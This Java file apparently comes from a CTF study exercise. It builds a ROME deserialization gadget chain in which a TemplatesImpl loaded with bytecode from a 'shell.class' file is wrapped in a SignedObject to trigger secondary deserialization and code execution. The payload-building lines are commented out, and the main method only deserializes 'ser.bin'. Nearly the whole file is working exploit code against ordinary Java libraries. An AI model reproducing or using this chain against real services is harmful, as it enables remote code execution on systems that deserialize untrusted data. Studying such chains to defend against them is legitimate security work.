package org.example;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import org.apache.commons.collections4.functors.ConstantTransformer;
import java.security.interfaces.DSAParams;
import java.security.interfaces.DSAPrivateKey;
import java.security.*;

import javax.xml.transform.Templates;
import java.io.*;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.lang.reflect.Field;

import java.util.HashMap;

public class SignedObjectTest {
    public static void main(String[] args) throws Exception {
        //二次反序列化的对象
//        TemplatesImpl templates = new TemplatesImpl();
//        byte[] bytes = Files.readAllBytes(Paths.get("D:\\ctf_tools\\java_study\\rome\\shell.class"));
//        setValue(templates,"_name","aaa");
//        setValue(templates,"_bytecodes",new byte[][]{bytes});
//        setValue(templates,"_tfactory",new TransformerFactoryImpl());
//        ToStringBean toStringBean = new ToStringBean(Templates.class,new ConstantTransformer(1));
//        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);
//        HashMap<Object,Object> hashMap = new HashMap<>();
//        hashMap.put(equalsBean,"123");
//        setValue(toStringBean,"_obj",templates);
//
//        //第一次反序列化的对象
//        SignedObject signedObject = makeSObj(hashMap);
//        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class,"1");
//        EqualsBean equalsBean1 = new EqualsBean(ToStringBean.class,toStringBean1);
//        HashMap<Object,Object> hashMap1 = new HashMap<>();
//        hashMap1.put(equalsBean1,"123");
//        setValue(toStringBean1,"_obj",signedObject);
//        serialize(hashMap1);
        unserialize("ser.bin");


    }
    public static SignedObject makeSObj(Serializable o) throws IOException, InvalidKeyException, SignatureException{
        return new SignedObject((Serializable) o,
                new DSAPrivateKey() {
                    @Override
                    public DSAParams getParams() {
                        return null;
                    }

                    @Override
                    public String getAlgorithm() {
                        return null;
                    }

                    @Override
                    public String getFormat() {
                        return null;
                    }

                    @Override
                    public byte[] getEncoded() {
                        return new byte[0];
                    }

                    @Override
                    public BigInteger getX() {
                        return null;
                    }
                },
                new Signature("1") {
                    @Override
                    protected void engineInitVerify(PublicKey publicKey) throws InvalidKeyException {

                    }

                    @Override
                    protected void engineInitSign(PrivateKey privateKey) throws InvalidKeyException {

                    }

                    @Override
                    protected void engineUpdate(byte b) throws SignatureException {

                    }

                    @Override
                    protected void engineUpdate(byte[] b, int off, int len) throws SignatureException {

                    }

                    @Override
                    protected byte[] engineSign() throws SignatureException {
                        return new byte[0];
                    }

                    @Override
                    protected boolean engineVerify(byte[] sigBytes) throws SignatureException {
                        return false;
                    }

                    @Override
                    protected void engineSetParameter(String param, Object value) throws InvalidParameterException {

                    }

                    @Override
                    protected Object engineGetParameter(String param) throws InvalidParameterException {
                        return null;
                    }
                }
        );
    }
    private static void setValue(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj,value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
